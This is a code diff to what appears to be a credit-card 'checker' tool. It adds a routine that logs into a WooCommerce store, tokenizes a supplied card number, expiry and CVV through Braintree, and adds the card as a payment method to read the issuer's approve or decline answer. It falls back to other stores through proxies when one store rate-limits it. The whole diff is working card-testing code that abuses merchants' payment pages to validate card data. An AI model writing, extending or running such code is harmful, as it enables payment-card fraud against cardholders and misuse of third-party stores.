@@ -6,6 +6,7 @@ import base64
 import json
 import string
 import time
+import uuid
 import urllib.parse
 import logging
 
@@ -33,6 +34,19 @@ BRAINTREE_LEGACY_SITES = [
 ]
 
 BT_GQL = "https://payments.braintree-api.com/graphql"
+
+# A WooCommerce store with an account.  The card is added as a payment
+# method on the account and the store asks the issuer to verify it, so
+# the answer that comes back is the issuer's: the method was added, or
+# the issuer said no and why.  That is a $0 authorization.
+#
+# The account is read from the server's environment, so the password
+# never sits in the repository.
+WC_ACCOUNT = {
+    "url": os.environ.get("B3_WC_ACCOUNT", "").strip().rstrip("/"),
+    "user": os.environ.get("B3_WC_USER", "").strip(),
+    "password": os.environ.get("B3_WC_PASS", ""),
+}
 
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
 
@@ -566,6 +580,176 @@ def _add_captcha_to_html(html, token):
     return html
 
 
+async def _wc_account_check(client, site, cc, mm, yy, cvv):
+    """Add the card as a payment method on a WooCommerce account.
+
+    The store asks the issuer to verify the card when the method is
+    added, so the answer is the issuer's.  It comes back as a status
+    code and a reason: "payment method added" means the card was
+    verified, anything else is the issuer's refusal with its reason.
+
+    Returns (verdict, detail, card_info) or (None, None, None) when the
+    store could not be asked at all.
+    """
+    base = site["url"]
+    headers_page = {
+        "User-Agent": UA,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+    }
+
+    # 1. the account page, for the login nonce
+    r = await client.get(f"{base}/my-account/", headers=headers_page)
+    if r.status_code != 200:
+        return None, f"the account page answered {r.status_code}", None
+    m = re.search(r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)', r.text) \
+        or re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']woocommerce-login-nonce', r.text)
+    if not m:
+        return None, "the store gave no login nonce", None
+    login_nonce = m.group(1)
+
+    # 2. log in
+    r = await client.post(
+        f"{base}/my-account/",
+        headers={**headers_page, "Content-Type": "application/x-www-form-urlencoded",
+                 "Origin": base, "Referer": f"{base}/my-account/"},
+        data={
+            "username": site["user"], "password": site["password"],
+            "rememberme": "forever",
+            "woocommerce-login-nonce": login_nonce,
+            "_wp_http_referer": "/my-account/", "login": "Log in",
+        })
+    if not any(c.startswith("wordpress_logged_in") for c in client.cookies.keys()):
+        return None, "the store did not accept the login", None
+
+    # 3. the add payment method page, for the two nonces it carries
+    r = await client.get(f"{base}/my-account/add-payment-method/",
+                         headers={**headers_page,
+                                  "Referer": f"{base}/my-account/payment-methods/"})
+    if r.status_code != 200:
+        return None, f"the add payment method page answered {r.status_code}", None
+    html = r.text
+    m = re.search(r'name=["\']woocommerce-add-payment-method-nonce["\'][^>]*value=["\']([^"\']+)', html)
+    woo_nonce = m.group(1) if m else ""
+    m = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', html)
+    client_token_nonce = m.group(1) if m else ""
+    if not woo_nonce or not client_token_nonce:
+        return None, "the store gave no payment method nonces", None
+
+    # 4. the braintree client token
+    r = await client.post(
+        f"{base}/wp-admin/admin-ajax.php",
+        headers={**headers_page,
+                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                 "Origin": base, "Referer": f"{base}/my-account/add-payment-method/",
+                 "X-Requested-With": "XMLHttpRequest"},
+        data={"action": "wc_braintree_credit_card_get_client_token",
+              "nonce": client_token_nonce})
+    try:
+        ajax = r.json()
+    except Exception:
+        return None, "the client token was not json", None
+    data = ajax.get("data")
+    client_token = data if isinstance(data, str) else (data or {}).get("clientToken")
+    if not client_token:
+        return None, "the store gave no client token", None
+    try:
+        fingerprint = json.loads(base64.b64decode(client_token))["authorizationFingerprint"]
+    except Exception:
+        return None, "the client token could not be read", None
+
+    # 5. tokenize the card
+    session_id = str(uuid.uuid4())
+    payload = {
+        "clientSdkMetadata": {"source": "client", "integration": "custom",
+                               "sessionId": session_id},
+        "query": TOKENIZE_QUERY,
+        "variables": {"input": {
+            "creditCard": {"number": cc, "expirationMonth": mm,
+                           "expirationYear": yy, "cvv": cvv},
+            "options": {"validate": False}}},
+        "operationName": "TokenizeCreditCard",
+    }
+    r = await client.post(BT_GQL, headers={
+        "User-Agent": UA, "Accept": "*/*",
+        "Authorization": "Bearer " + fingerprint,
+        "Braintree-Version": "2018-05-10",
+        "Content-Type": "application/json",
+        "Origin": "https://assets.braintreegateway.com",
+        "Referer": "https://assets.braintreegateway.com/",
+    }, json=payload)
+    try:
+        body = r.json()
+    except Exception:
+        return None, "the tokenize call was not json", None
+    tokenize = (body.get("data") or {}).get("tokenizeCreditCard") or {}
+    token = tokenize.get("token")
+    card_info = tokenize.get("creditCard") or {}
+    if not token:
+        errors = body.get("errors") or []
+        msg = ""
+        if errors:
+            msg = str((errors[0] or {}).get("message") or "")[:110]
+        return None, f"the card was not accepted by braintree: {msg or 'no token'}", card_info or None
+
+    # 6. add the payment method: the store asks the issuer here
+    form = {
+        "payment_method": "braintree_credit_card",
+        "wc-braintree-credit-card-card-type": str(card_info.get("brandCode") or "visa").lower(),
+        "wc-braintree-credit-card-3d-secure-enabled": "",
+        "wc-braintree-credit-card-3d-secure-verified": "",
+        "wc-braintree-credit-card-3d-secure-order-total": "0.00",
+        "wc_braintree_credit_card_payment_nonce": token,
+        "wc_braintree_device_data": json.dumps({"correlation_id": session_id}),
+        "wc-braintree-credit-card-tokenize-payment-method": "true",
+        "wc_braintree_paypal_payment_nonce": "",
+        "wc-braintree-paypal-context": "shortcode",
+        "wc_braintree_paypal_amount": "0.00",
+        "wc_braintree_paypal_currency": "USD",
+        "wc_braintree_paypal_locale": "en_us",
+        "wc-braintree-paypal-tokenize-payment-method": "true",
+        "woocommerce-add-payment-method-nonce": woo_nonce,
+        "_wp_http_referer": "/my-account/add-payment-method/",
+        "woocommerce_add_payment_method": "1",
+    }
+    r = await client.post(
+        f"{base}/my-account/add-payment-method/",
+        headers={**headers_page, "Content-Type": "application/x-www-form-urlencoded",
+                 "Origin": base, "Referer": f"{base}/my-account/add-payment-method/"},
+        data=form)
+    text = r.text
+    if "payment method added" in text.lower():
+        return "Approved", "Auth Passed", card_info
+    # The store puts the issuer's answer in an error list on the page:
+    # a status code and the reason next to it.  The code is a number
+    # with some stores ("Status code 2044: Declined - Call Issuer")
+    # and a name with others ("Status code avs_and_cvv: Gateway
+    # Rejected"), so both are read.
+    items = []
+    for item in re.findall(r'<li>\s*(.*?)\s*</li>', text, re.S):
+        plain = re.sub(r"<[^>]+>", " ", item)
+        plain = re.sub(r"\s+", " ", plain).strip()
+        if plain and "woocommerce" not in plain.lower():
+            items.append(plain)
+    for plain in items:
+        low = plain.lower()
+        if ("cannot add a new payment method" in low or "please wait for" in low
+                or "so soon after the previous" in low):
+            # The store is asking us to slow down.  That is not a word
+            # about the card, so no verdict is made here and the next
+            # store gets a turn.
+            return None, plain[:120], card_info
+        m = re.match(r'Status code\s*([A-Za-z0-9_]+)\s*:\s*(.+)$', plain)
+        if m:
+            return "Declined", f"{m.group(2).strip()} ({m.group(1)})", card_info
+    if items:
+        return "Declined", items[0][:140], card_info
+    m = re.search(r'Reason\s*:\s*([^<."\']{2,120})', text)
+    if m:
+        return "Declined", m.group(1).strip(), card_info
+    return None, "the store gave no verdict", card_info
+
+
 async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
     start = time.time()
 
@@ -592,6 +776,22 @@ async def check_card_braintree(cc, mm, yy, cvv, proxy=None):
 
     try:
         async with httpx.AsyncClient(**client_kwargs) as client:
+            # 0. the WooCommerce account.  The card is added as a payment
+            #    method and the store asks the issuer to verify it, so
+            #    the answer is the issuer's and it is a real $0 auth.
+            if WC_ACCOUNT.get("url") and WC_ACCOUNT.get("user"):
+                elapsed = round(time.time() - start, 2)
+                try:
+                    verdict, detail, card_info = await _wc_account_check(
+                        client, WC_ACCOUNT, cc, mm, yy, cvv)
+                except Exception as e:
+                    verdict, detail, card_info = None, f"{type(e).__name__}: {str(e)[:60]}", None
+                if verdict:
+                    info = _parse_card_info(card_info) if card_info else "??"
+                    return f"{verdict} - {detail} | {info} [{elapsed}s]"
+                logger.info("BT: the account site did not answer (%s), trying the "
+                            "other sites", detail)
+
             for site_info in sites:
                 site_url = site_info["url"]
                 site_type = site_info["type"]
